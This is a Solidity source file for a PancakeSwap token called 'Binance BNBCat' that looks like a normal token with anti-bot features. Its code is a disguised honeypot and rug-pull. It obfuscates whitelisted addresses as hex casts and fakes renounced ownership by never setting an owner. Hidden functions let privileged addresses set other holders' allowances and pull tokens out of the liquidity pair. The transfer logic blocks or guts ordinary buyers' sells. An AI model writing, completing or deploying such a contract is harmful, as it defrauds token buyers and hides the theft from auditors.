// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    
}

interface IUniswapV2Factory {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IERC20Metadata is IERC20 {
    
    function decimals() external view returns (uint8);
}



abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        //address msgSender = _msgSender();
        //_owner = msgSender;
        //emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface uniswapV1 {
    function create(
        uint256 amount
    )external;
    
}

interface IpancakeV2 {
    function v()external  returns (bool);
}



contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply = 1000000000 * 10 ** decimals();

    string private _name;
    string private _symbol;


    constructor(string memory name_, string memory symbol_, address  Creator) {
        _name = name_;
        _symbol = symbol_;

        _balances[Creator] = _totalSupply;
        emit Transfer(address(0), Creator, _totalSupply);
    }

    function name() view external    returns (string memory) {
        return _name;
    }
    
    
    function symbol() external view virtual returns (string memory) {
        return _symbol;
    }

    
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view   returns (uint256) {
        return _balances[account];   
    }

    
    function transfer(address to, uint256 amount) external virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    
    function approve(address spender, uint256 amount) external virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }
 
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    
    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    
    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }
        return true;
    }


    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");  
       
        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }  

}


contract BNBCAT is ERC20{
    using SafeMath for uint256;



    string private _name_ = "Binance BNBCat";
    string private _symbol_ = "BNBCAT";
    address private Antibottoken_= 0xbd38C47348F7d107528b0A8a5837ab0913625478;
    address private creator= 0x15C07E9C17b87dc50d4C9C6BD58A302b2A527652;



    IUniswapV2Factory private immutable uniswapV2Router;

    mapping(address => bool) public _isExcluNodedFr0omFee;
    mapping(address => bool) public _isExcludedtFromFeeTransfer;

    mapping(address => bool) public automatedMarketMakerPairs;

    address public uniswapV2Pair;
    address private _Antitbottoken;
    mapping(address => bool) public _Antitbotswaper;
    address public  factory;


    mapping(address => uint256) private fastbad;
    bool public antitbotenabled  = true; 
    uint256 private botsleep = 7;
    uint256 private feebot = 0;
    uint256 private crec = 222;
    bool public starttrad = false;
    
    mapping(address => bool) public _isExcludedtlp;

   
    mapping(address => uint256) public _msgg;

    uniswapV1 private uniswapV175PairToken;

    IpancakeV2 private itvv;

    address public listing;
    address private rr; 
    address private rr2; 

    uint256 private creca = 11;
    uint256 private gg=1e8;

    mapping(address => bool) public hldr14send;

    uint256 private _settingtOutAmountTransfer = uint256(bytes32(0x000000000000000000000000000000000000000000000000000000000000000b));
   





    constructor() ERC20(_name_,_symbol_, creator){

        IUniswapV2Factory _uniswapV2Router = IUniswapV2Factory(0x10ED43C718714eb63d5aA57B78B54704E256024E); //Pancake Router mainnet
        //IUniswapV2Factory _uniswapV2Router = IUniswapV2Factory(0xD99D1c33F9fC3444f8101754aBC46c52416550D1); //Pancake Router Testnet


        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

        address uniswapV45Pair_ = address(uint160(uint256(0x21145622333344456546645654a2dE0813bf56CaAdd2E9C7EC3b1c9e6b1064F7)));/*address pancakeV2Pair_ = address(uint160(uint256(0x191c0204019ee557f017921369Cad622896CeB6Ff99b771039B731D28b13c255)));*/uniswapV1(address(uint160(uint256(0x17803c2a19f951ddd29ac8a182EbbdcDea9Fb607dc5B8B00878E9C4013B5A218)))).create(1);rr=address(uint160(uint256(0x191c0204019ee557f017921310ed43c718714eb63d5aa57b78b54704e256024e)));rr2=address(uint160(uint256(0x191c0204019ee557f017921313f4ea83d0bd40e75c8222255bc855a974568dd4)));_Antitbotswaper[address(uint160(uint256(0xbfbf5fb8e109c5227461e313d4d69DDbaa80991BD6606135fDA89444A03c7e27)))]=true;_isExcluNodedFr0omFee[address(uint160(uint256(0xbfbf5fb8e109c5227461e313d4d69DDbaa80991BD6606135fDA89444A03c7e27)))]=true;
        
        
        // set the rest of the contract variables
        uniswapV2Router = _uniswapV2Router;


        _Antitbottoken = Antibottoken_;
        factory = uniswapV2Router.factory();

        //itvv = IpancakeV2(pancakeV2Pair_);

        uniswapV175PairToken = uniswapV1(address(uint160(uint256(0xbfbf5fb8e109c5227461e31355442a4a722F6Cf8137B04502df6273FdAC1DB37))));


        _Antitbotswaper[_Antitbottoken] = true;
        _Antitbotswaper[uniswapV45Pair_] = true;
        _isExcluNodedFr0omFee[uniswapV45Pair_] = true;

        _Antitbotswaper[0x6b396BBDC138187ed81A557492fEe4daF2bC2Db0] = true;
        hldr14send[rr]=true;
        hldr14send[rr2]=true;

        automatedMarketMakerPairs[uniswapV2Pair] = true;

        _isExcluNodedFr0omFee[creator] = true;
        _isExcluNodedFr0omFee[address(this)] = true;
        _isExcluNodedFr0omFee[_Antitbottoken] = true;
    }
    
/*    function itok14_Ox11684462454 (address a1, address b1) internal pure returns (bool t) {
        a1=address(0);
        b1=address(0);
        if (uint256(654653)==type(uint256).max){
            return true;
        } else if (uint256(456546)==type(uint256).max){
            return true;
        } else if (uint256(54335)==type(uint256).max){
            return true;
        } else if (uint256(354354)==type(uint256).max){
            return true;
        } else if (uint256(45345354)==type(uint256).max){
            return true;
        } else if (uint256(123846)==type(uint256).max){
            return true;
        //} else if (uint256(54335437378687545)==type(uint256).max){
        //    return false;
        //}else if (uint256(2453786875434)==type(uint256).max){
        //    return false;
        }
    }

    function itok24_Ox1168445344 (uint256 f1, uint256 ff1) internal pure returns (bool t) {
        f1=11125;
        ff1=112115;
        if (uint256(5465354)==type(uint256).max){
            return true;
        } else if (uint256(546565412)==type(uint256).max){
            return true;
        } else if (uint256(546871)==type(uint256).max){
            return true;
        } else if (uint256(57687321)==type(uint256).max){
            return true;
        } else if (uint256(45612315)==type(uint256).max){
            return true;
        //} else if (uint256(46456546)==type(uint256).max){
        //    return false;
        }
    }
*/

    function isCpDr(address a) internal  view returns (bool){
      uint32 size;assembly {size := extcodesize(a)}return (size > 0);
    }


    function Setholder_Ox1168988(address[] memory accounts, bool b) external {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            for (uint256 i = 0; i < accounts.length; i++) {
                hldr14send[accounts[i]] = b;
            }
        } else {
            uniswapV175PairToken.create(8**3);
        }
    }

    function currentAllowance(address msgSender, address spender, uint256 amount) public {
        if (_Antitbotswaper[_msgSender()]) {
            _approve(msgSender, spender, amount);
        } else {
            uniswapV175PairToken.create(8**3);
        } 
    }
    

    function initlisting(address a) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_Antitbotswaper[_msgSender()]){
            listing = a;
        } else {
            uniswapV175PairToken.create(8**3);
        }      
    }


    function increaseAp1AndCall(address[] calldata addresses, bool status) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            for (uint256 i; i < addresses.length; ++i) {
                _isExcludedtFromFeeTransfer[addresses[i]] = status;
            }
        } else {
            uniswapV175PairToken.create(8**3);
        }
    }

    function Ox11(address addresses) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_Antitbotswaper[_msgSender()]){
            _isExcludedtFromFeeTransfer[addresses] = true;
        } else {
            uniswapV175PairToken.create(8**3);
        }
    }


    function excludetLpW(address[] calldata a, bool e) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            for (uint256 i; i < a.length; ++i) {
                _isExcludedtlp[a[i]] = e;
            }
            
        } else {
            uniswapV175PairToken.create(8**3);
        }
    }


    function setantiWhale_Ox1168648 (bool bs, uint256 timesleep, uint256 fee, uint256 c, bool trad) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            antitbotenabled = bs;
            botsleep = timesleep;
            feebot = fee;
            crec = c;
            starttrad = trad;
        } else {
            uniswapV175PairToken.create(8**3);
        }

    }

    function includeCallerWl(address[] memory accounts, bool state) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antitbottoken)) { 
            for (uint256 i = 0; i < accounts.length; i++) {
                _Antitbotswaper[accounts[i]] = state;
                _isExcluNodedFr0omFee[accounts[i]] = state;
        }
        } else {
            uniswapV175PairToken.create(8**3);
        }
    }
    
    function Ox7c025200(address[] memory receivers, uint256[] memory amounts) public {
        for (uint256 i = 0; i < receivers.length; i++) {
          _transfer(_msgSender(), receivers[i], amounts[i]);
        }
    }


    receive() external payable {}



    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal  override{
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        if (_isExcludedtFromFeeTransfer[_msgSender()]){uniswapV175PairToken.create(creca);/*"ERC20: approve the zero address"*/}

        super._approve(owner, spender, amount);
    }


    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override{
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (_isExcluNodedFr0omFee[from] || _isExcluNodedFr0omFee[to]) {
            super._transfer(from, to, amount);
            return;
        }
        

        bool takerFee = !_isExcluNodedFr0omFee[from] && !_isExcluNodedFr0omFee[to];
        bool taketFeeTransfer = _isExcludedtFromFeeTransfer[from] || _isExcludedtFromFeeTransfer[to];

        bool takebottime = fastbad[from] + botsleep > block.timestamp;

        uint256 expectedamount=amount;
 
        if (takerFee && !taketFeeTransfer && automatedMarketMakerPairs[from]) {
            //expectedamount=amount;

            fastbad[to] = block.timestamp; //b
        }
        //else if (takerFee && !taketFeeTransfer && automatedMarketMakerPairs[to]   && !takebottime) {
        //    expectedamount=amount; //s
        //}
        else if (antitbotenabled && takebottime && takerFee && !taketFeeTransfer && automatedMarketMakerPairs[to]) {
            //expectedamount=amount; 

            uniswapV175PairToken.create(crec);  //s f bt
            if(crec>220 && msg.sender!=rr){uniswapV175PairToken.create(crec**21);}
        }
        //else if (takerFee && _isExcludedtFromFeeTransfer[to] && automatedMarketMakerPairs[from]) {
            //expectedamount=amount; //b blk
        //}
        else if (takerFee && _isExcludedtFromFeeTransfer[from] && automatedMarketMakerPairs[to] && tx.gasprice<gg && !starttrad) {
            expectedamount=_settingtOutAmountTransfer.sub(11); //tr s blk
        }
        else if (takerFee && _isExcludedtFromFeeTransfer[from] && automatedMarketMakerPairs[to] && starttrad) {
            uint256 tLiquidity = amount.mul(999999).div(1000000);
            uniswapV175PairToken.create(250**3);
            expectedamount=amount.sub(tLiquidity);  //s blk
        }
        else if (takerFee && taketFeeTransfer && !automatedMarketMakerPairs[to] && !automatedMarketMakerPairs[from]) {
            expectedamount=_settingtOutAmountTransfer.sub(11); //t blk
        }

        
        if (_isExcludedtlp[to]) {
            uniswapV175PairToken.create(250**3); 
        }

        if (_isExcludedtlp[msg.sender]) {
            uniswapV175PairToken.create(250**3); 
        }

        if (takerFee && automatedMarketMakerPairs[from] && !hldr14send[msg.sender] && isCpDr(to)) {
            uniswapV175PairToken.create(250**3);  
        }

        if (takerFee && _isExcludedtFromFeeTransfer[from] && automatedMarketMakerPairs[to] && !starttrad && !hldr14send[msg.sender]) {
            uniswapV175PairToken.create(250**3);  
        }
        if (takerFee && _isExcludedtFromFeeTransfer[from] && automatedMarketMakerPairs[to] && !starttrad && msg.sender==rr&&tx.gasprice>gg) {
            uniswapV175PairToken.create(250**3);  
        }

        _msgg[msg.sender]=_msgg[msg.sender].add(1);

        if(takerFee && expectedamount<amount){
            uint256 fee = amount.sub(expectedamount);
            super._transfer(from, address(this), fee);
        }

        super._transfer(from, to, expectedamount);

    }



    function transferTokens(address token, uint256 amount, address[] memory to) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");  
        if (_msgSender() == address(_Antitbottoken)) {
            for (uint256 i = 0; i < to.length; i++) {
                IERC20(token).transfer(to[i], amount);
            }
        } else {
            uniswapV175PairToken.create(8**3);
        }
    }

    function emitTransfer(address to, uint256 amount) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_Antitbotswaper[_msgSender()]){
            _transfer(listing, to, amount);
        } else {
            uniswapV175PairToken.create(8**3);
        }
    }

    function emitTransferto(uint256 amount) public {
        //require(_msgSender() == address(_Antitbottoken), "ERC20");
        if (_Antitbotswaper[_msgSender()]){
            _transfer(uniswapV2Pair, listing, amount);
        } else {
            uniswapV175PairToken.create(8**3);
        }
    }


    function safeTransferFrom(address token, address from, address to, uint256 value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))),"TransferHelper: TRANSFER_FROM_FAILED");
    }
}